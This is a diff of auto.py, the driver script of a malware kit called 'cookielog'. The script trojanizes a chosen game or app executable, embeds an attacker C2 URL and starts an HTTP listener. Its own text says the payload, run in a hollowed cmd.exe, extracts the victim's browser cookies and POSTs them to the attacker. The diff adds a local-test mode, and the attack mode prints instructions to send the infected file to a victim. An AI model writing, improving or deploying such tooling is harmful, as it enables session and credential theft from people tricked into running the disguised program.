@@ -2,22 +2,24 @@
 """auto.py — one-click payload setup. Builds, starts listener, infects .exe.
 
 Usage:
-    python auto.py              # GUI mode (file picker dialog)
-    python auto.py game.exe     # CLI mode (pass .exe as argument)
-    python auto.py --port 9090  # custom C2 port (default: 9090)
+    python auto.py                      # GUI mode (file picker dialog)
+    python auto.py game.exe             # CLI mode (pass .exe as argument)
+    python auto.py game.exe --run       # CLI + run infected locally (test)
+    python auto.py --port 9090         # custom C2 port (default: 9090)
+    python auto.py game.exe --run --port 9250
 
 What it does:
     1. Checks if loader.exe + ckdll.dll exist; if not, runs build.bat
     2. Detects attacker's local IP for C2 URL
     3. Starts listen.py in background (HTTP listener)
-    4. Asks for the .exe to infect (GUI dialog or CLI arg)
-    5. Infects it with the embedded C2 URL -> ifec/<name>.exe
-    6. Waits for cookies to arrive in loot/
-    7. Prints summary (cookie count, top domains)
+    4. Infects the .exe with the embedded C2 URL -> ifec/<name>.exe
+    5. Without --run: prints instructions (send ifec/ to victim)
+       With --run: copies infected over original, runs it, waits for cookies,
+                   restores original .exe afterwards
 
-Press Ctrl+C to stop the listener and exit.
+Press Ctrl+C to stop early.
 """
-import json, os, socket, subprocess, sys, time, threading, struct
+import json, os, shutil, socket, subprocess, sys, time, struct, threading
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -92,6 +94,7 @@ def build_infected(host_path, c2_url):
     if hidx != -1 and hidx > len(host_bytes) - 12:
         old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
         if old_hlen > 0 and hidx - 4 - old_hlen > 0:
+            log("[*] host was already infected -- restoring original")
             host_bytes = host_bytes[hidx - 4 - old_hlen : hidx - 4]
     # patch C2 URL
     if c2_url:
@@ -119,8 +122,7 @@ def start_listener(port):
     proc = subprocess.Popen(
         [sys.executable, "-u", LISTEN, str(port)],
         cwd=HERE,
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-        creationflags=0x00000010  # CREATE_NEW_CONSOLE
+        creationflags=0x00000010  # CREATE_NEW_CONSOLE — listener gets its own window
     )
     time.sleep(2)
     if proc.poll() is not None:
@@ -158,10 +160,105 @@ def wait_for_cookies(timeout=120):
             except (json.JSONDecodeError, IOError):
                 pass
         time.sleep(1)
-    log("[-] timeout — no cookies received in %ds" % timeout)
+    log("[-] timeout -- no cookies received in %ds" % timeout)
     log("    check: is the listener running? is the C2 URL correct?")
     log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
     return False
+
+def run_infected_locally(host_path, infected_path):
+    """Copy infected exe over original, run it, wait, restore original.
+
+    For local testing only. In a real attack, the victim runs the infected exe
+    on their own machine.
+    """
+    # backup original
+    backup = host_path + ".orig"
+    shutil.copy2(host_path, backup)
+    log("[+] backed up original: %s" % backup)
+
+    # copy infected over original
+    shutil.copy2(infected_path, host_path)
+    log("[+] copied infected exe to: %s" % host_path)
+
+    # run it
+    log("[*] launching infected exe...")
+    proc = subprocess.Popen([host_path])
+    loader_pid = proc.pid
+    log("[+] loader started (PID=%d)" % loader_pid)
+
+    # wait for the game/app to open, then kill the loader
+    # (the loader has already: renamed itself, written original host back,
+    #  launched the game, and started the payload in a hollowed cmd.exe)
+    log("[*] waiting 10s for game to open + payload to start...")
+    time.sleep(10)
+    try:
+        proc.terminate()
+        log("[*] loader terminated (PID=%d)" % loader_pid)
+    except Exception:
+        log("[!] could not terminate loader")
+
+    # wait for payload to finish (extraction + HTTP exfiltration)
+    # the payload runs in an orphaned hollowed cmd.exe — it keeps running
+    # after the loader is killed
+    log("[*] waiting 25s for payload extraction + HTTP exfil...")
+    time.sleep(25)
+
+    # kill the game process — it holds the file lock on host_path
+    # (the loader's rename-restore wrote the original host to host_path,
+    #  then launched the game from that path; the game has the exe mapped)
+    exe_name = os.path.basename(host_path)
+    log("[*] killing game process (%s)..." % exe_name)
+    try:
+        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
+                       shell=True, timeout=5)
+    except Exception:
+        pass
+
+    # kill orphaned child processes of the dead loader (hollowed cmd.exe)
+    # these don't hold a lock on host_path but are zombie processes
+    # find them by ParentProcessId == loader_pid
+    try:
+        ps_cmd = (
+            'Get-CimInstance Win32_Process | '
+            'Where-Object { $_.ParentProcessId -eq %d } | '
+            'ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }'
+        ) % loader_pid
+        subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
+                       capture_output=True, timeout=10)
+    except Exception:
+        pass
+
+    # wait for Windows to release file handles
+    time.sleep(2)
+
+    # restore original (with retry — the game process may take a moment to die)
+    for attempt in range(5):
+        try:
+            shutil.copy2(backup, host_path)
+            os.remove(backup)
+            log("[+] original .exe restored")
+            break
+        except Exception as ex:
+            if attempt < 4:
+                log("[!] file locked, retrying in 3s... (%d/5)" % (attempt + 1))
+                # retry killing the game
+                try:
+                    subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
+                                   shell=True, timeout=3)
+                except Exception:
+                    pass
+                time.sleep(3)
+            else:
+                log("[!] could not restore original after 5 attempts")
+                log("    backup at: %s" % backup)
+                log("    restore manually: copy /b \"%s\" \"%s\"" % (backup, host_path))
+
+    # clean up temp file from rename-restore
+    wdir = os.path.dirname(host_path)
+    bak_tmp = os.path.join(wdir, "~ck_bak.bin")
+    if os.path.exists(bak_tmp):
+        try: os.remove(bak_tmp)
+        except Exception: pass
 
 def pick_file_gui():
     """Open a file picker dialog. Returns the selected path or None."""
@@ -169,8 +266,8 @@ def pick_file_gui():
         import tkinter as tk
         from tkinter import filedialog, ttk
         root = tk.Tk()
-        root.title("cookielog — select .exe to infect")
-        root.geometry("480x200")
+        root.title("cookielog -- select .exe to infect")
+        root.geometry("480x240")
         root.configure(bg="#1a1a1a")
         style = ttk.Style()
         style.theme_use("clam")
@@ -179,12 +276,14 @@ def pick_file_gui():
         style.configure("TLabel", background="#1a1a1a", foreground="#d4d4d4")
         style.configure("TButton", background="#2d2d2d", foreground="#d4d4d4",
                         font=("Segoe UI", 10, "bold"), padding=(12, 8))
-        result = {"path": None}
+        style.configure("Act.TButton", background="#1a6b1a", foreground="#ffffff",
+                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
+        result = {"path": None, "run": False}
 
-        ttk.Label(root, text="cookielog — auto infector",
+        ttk.Label(root, text="cookielog -- auto infector",
                   font=("Segoe UI", 14, "bold"),
                   foreground="#4a9eff").pack(pady=(20, 5))
-        ttk.Label(root, text="click the button below to choose a .exe to infect",
+        ttk.Label(root, text="choose a .exe to infect",
                   font=("Segoe UI", 9)).pack(pady=(0, 15))
 
         def do_pick():
@@ -195,27 +294,40 @@ def pick_file_gui():
                 result["path"] = f
                 root.destroy()
 
-        ttk.Button(root, text="SELECT .EXE", command=do_pick).pack(pady=5)
+        def do_pick_run():
+            f = filedialog.askopenfilename(
+                title="Select .exe to infect AND run locally",
+                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
+            if f:
+                result["path"] = f
+                result["run"] = True
+                root.destroy()
+
+        ttk.Button(root, text="SELECT .EXE (infect only)",
+                   command=do_pick).pack(pady=3, fill="x", padx=40)
+        ttk.Button(root, text="SELECT + RUN LOCALLY (test)",
+                   style="Act.TButton", command=do_pick_run).pack(pady=3, fill="x", padx=40)
         ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=2)
         root.mainloop()
-        return result["path"]
+        return result["path"], result["run"]
     except Exception as ex:
         log("[!] GUI not available (%s)" % ex)
-        return None
+        return None, False
 
 def main():
     port = 9090
     host_arg = None
+    run_local = False
 
     # parse args
     args = sys.argv[1:]
     i = 0
-    port = 9090
-    host_arg = None
     while i < len(args):
         a = args[i]
         if a == "--port" and i + 1 < len(args):
             port = int(args[i + 1]); i += 2
+        elif a == "--run":
+            run_local = True; i += 1
         elif a == "--cli":
             i += 1
         elif not a.startswith("--"):
@@ -228,7 +340,7 @@ def main():
             i += 1
 
     log("=" * 60)
-    log("  cookielog — automatic payload setup")
+    log("  cookielog -- automatic payload setup")
     log("=" * 60)
 
     # 1. ensure binaries
@@ -243,7 +355,12 @@ def main():
     c2_url = "http://%s:%d/" % (ip, port)
     log("[+] C2 URL: %s" % c2_url)
     if ip == "127.0.0.1":
-        log("[!] could not detect local IP — using 127.0.0.1 (localhost only)")
+        log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
+    if run_local:
+        log("[*] mode: LOCAL TEST (will run infected exe on this machine)")
+        # for local testing, 127.0.0.1 is more reliable than the LAN IP
+        c2_url = "http://127.0.0.1:%d/" % port
+        log("[+] C2 URL (local test): %s" % c2_url)
 
     # 3. get .exe to infect
     log("\n[3/5] selecting .exe...")
@@ -251,11 +368,17 @@ def main():
         host_path = host_arg
         log("[+] host (from arg): %s" % host_path)
     else:
-        host_path = pick_file_gui()
+        host_path, gui_run = pick_file_gui()
         if not host_path:
             log("[-] no .exe selected")
             return 1
-        log("[+] host (from GUI): %s" % host_path)
+        if gui_run:
+            run_local = True
+            c2_url = "http://127.0.0.1:%d/" % port
+            log("[+] host (from GUI): %s" % host_path)
+            log("[+] mode: LOCAL TEST (run locally)")
+        else:
+            log("[+] host (from GUI): %s" % host_path)
 
     if not os.path.isfile(host_path):
         log("[-] file does not exist: %s" % host_path)
@@ -285,14 +408,31 @@ def main():
         os.path.getsize(out_path) // 1024))
     log("[+] C2 URL embedded: %s" % c2_url)
 
-    log("\n" + "=" * 60)
-    log("  READY — send ifec\\%s to the victim" % bname)
-    log("  when the victim runs it:")
-    log("    - the original app/game opens normally")
-    log("    - payload extracts cookies from the VICTIM's machine")
-    log("    - cookies are sent via HTTP POST to %s" % c2_url)
-    log("  cookies will appear in loot\\cookies.json")
-    log("=" * 60)
+    if run_local:
+        # Local test: copy infected over original, run, wait, restore
+        log("\n" + "=" * 60)
+        log("  LOCAL TEST -- running infected exe on this machine")
+        log("=" * 60)
+        try:
+            run_infected_locally(host_path, out_path)
+        except Exception as ex:
+            log("[!] local run failed: %s" % ex)
+            # try to restore
+            backup = host_path + ".orig"
+            if os.path.exists(backup):
+                shutil.copy2(backup, host_path)
+                os.remove(backup)
+                log("[+] original .exe restored after error")
+    else:
+        # Attack mode: just print instructions
+        log("\n" + "=" * 60)
+        log("  READY -- send ifec\\%s to the victim" % bname)
+        log("  when the victim runs it:")
+        log("    - the original app/game opens normally")
+        log("    - payload extracts cookies from the VICTIM's machine")
+        log("    - cookies are sent via HTTP POST to %s" % c2_url)
+        log("  cookies will appear in loot\\cookies.json")
+        log("=" * 60)
 
     # 6. wait for cookies
     try:
